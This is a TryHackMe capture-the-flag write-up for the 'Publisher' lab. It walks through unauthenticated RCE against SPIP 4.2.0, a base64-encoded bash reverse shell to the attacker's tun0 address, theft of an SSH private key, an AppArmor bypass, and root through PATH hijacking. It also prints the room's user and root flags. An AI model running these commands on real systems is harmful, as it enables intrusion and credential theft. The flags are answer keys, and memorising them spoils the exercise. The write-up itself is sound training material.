# Publisher — TryHackMe Writeup

**Platform:** TryHackMe  
**Difficulty:** Medium  
**Objective:** Exploit a vulnerable CMS to gain RCE, bypass AppArmor restrictions, and escalate to root via PATH hijacking and SUID abuse.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Initial Access — SPIP RCE](#3-initial-access--spip-rce)
4. [Lateral Movement — SSH Key](#4-lateral-movement--ssh-key)
5. [Privilege Escalation — AppArmor Bypass + PATH Hijacking](#5-privilege-escalation--apparmor-bypass--path-hijacking)
6. [Flags](#6-flags)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

### Nmap

```bash
nmap 10.67.136.246 -sC -sV -p- --min-rate 5000
```

**Open ports:**

| Port | Service |
|------|---------|
| 22 | SSH (OpenSSH) |
| 80 | HTTP (Apache) |

Only two ports open — the attack surface is purely web-based.

---

## 2. Web Enumeration

### Directory fuzzing

```bash
ffuf -u http://10.67.136.246/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
```

Discovered `/spip` — a SPIP CMS installation.

### Version identification

Navigating to `http://10.67.136.246/spip/spip.php?page=recherche` reveals **SPIP v4.2.0** in the page footer.

---

## 3. Initial Access — SPIP RCE

### CVE identification

SPIP 4.2.0 is vulnerable to an **unauthenticated Remote Code Execution** via the search parameter.

```bash
searchsploit spip 4.2
# php/webapps/51536.py — Remote Code Execution (Unauthenticated)
```

### Exploit setup

Copy and fix a urllib3 compatibility issue:

```bash
cp /usr/share/exploitdb/exploits/php/webapps/51536.py /tmp/51536.py
```

Remove or comment out line 63:
```python
# requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
```

### Getting a shell

The exploit uses blind RCE — direct command output is not returned. Use a base64-encoded reverse shell to avoid character issues with quotes:

```bash
echo -n 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8...
```

Start the listener:
```bash
nc -lvnp 4444
```

Execute the payload:
```bash
python3 /tmp/51536.py -u http://10.67.136.246/spip \
  -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8... | base64 -d | bash' -v
```

**Shell obtained as:** `www-data`

**User Flag:** `fa229046d44eda6a3598c73ad96f4ca5`  
*(found at `/home/think/user.txt` — readable by www-data)*

---

## 4. Lateral Movement — SSH Key

Enumerating the filesystem as `www-data`:

```bash
find /home -name "id_rsa" 2>/dev/null
# /think/.ssh/id_rsa
```

Copy the private key to Kali and connect:

```bash
chmod 600 think_rsa
ssh -i think_rsa think@10.67.136.246
```

---

## 5. Privilege Escalation — AppArmor Bypass + PATH Hijacking

### Understanding the environment

```bash
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```

Notable findings:
- `/var/tmp` — writable
- `/opt/run_container.sh` — **world-writable (777)**
- `/etc/systemd/system/switcheroo-control.service` — writable

### Identifying the custom binary

```bash
/usr/sbin/run_container
```

This binary calls `/opt/run_container.sh`, which manages Docker containers. The script calls `docker` **without an absolute path** — a PATH hijacking opportunity.

### Understanding AppArmor restrictions

```bash
cat /etc/apparmor.d/usr.sbin.ash
```

The `ash` shell (currently in use via SSH) is under AppArmor restrictions:
```
deny /opt/ r,
deny /opt/** w,
deny /tmp/** w,
deny /dev/shm w,
deny /var/tmp w,
deny /home/** w,
```

> **Key insight:** The AppArmor profile only applies to `ash`. Spawning a `bash` shell bypasses all these restrictions.

### Step 1 — Create a fake `docker` binary

```bash
echo '#!/bin/bash' > /var/tmp/docker
echo '/bin/bash -p' >> /var/tmp/docker
chmod +x /var/tmp/docker
```

### Step 2 — Inject `/var/tmp` into PATH and run the script

```bash
export PATH=/var/tmp:$PATH
cp /var/tmp/docker /opt/run_container.sh
/usr/sbin/run_container
```

When `run_container` executes, it calls the modified script, which calls the fake `docker`, which spawns **bash** — outside AppArmor control.

```
bash-5.0# whoami
root
```

### Step 3 — Read the root flag

```bash
cat /root/root.txt
```

**Root Flag:** `3a4225cc9e85709adda6ef55d6a4f2ca`

---

## 6. Flags

| Flag | Value |
|------|-------|
| user.txt | `fa229046d44eda6a3598c73ad96f4ca5` |
| root.txt | `3a4225cc9e85709adda6ef55d6a4f2ca` |

---

## 7. Key Takeaways

### CVE exploitation requires adaptation
Public exploits often need minor fixes for compatibility. In this case, a urllib3 API change broke the exploit — a one-line fix was enough. Always read the source before running.

### Blind RCE requires creative payloads
When command output isn't reflected back, use out-of-band channels (reverse shell). Base64 encoding avoids shell quoting issues that break payloads with special characters.

### AppArmor profiles are shell-specific
The restriction applied only to `ash`. Spawning `bash` — even indirectly through a script — creates a new process outside the AppArmor profile. Always check which shell a profile targets.

### PATH hijacking via relative binary calls
Scripts calling binaries without absolute paths (e.g., `docker` instead of `/usr/bin/docker`) are vulnerable to PATH injection. If you can write to any directory earlier in `$PATH`, you control what gets executed.

### World-writable scripts are critical misconfigurations
`/opt/run_container.sh` with `777` permissions allowed direct overwrite of a privileged script — a severe misconfiguration that would be a P1 finding in a real bug bounty program.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port and service reconnaissance |
| ffuf | Web directory fuzzing |
| searchsploit | CVE and exploit lookup |
| Python exploit (51536.py) | SPIP 4.2.0 RCE |
| msfvenom / base64 | Payload encoding |
| nc (netcat) | Reverse shell listener |
| SSH | Lateral movement with stolen key |

---

*Writeup by: Lindomar | TryHackMe | Publisher*
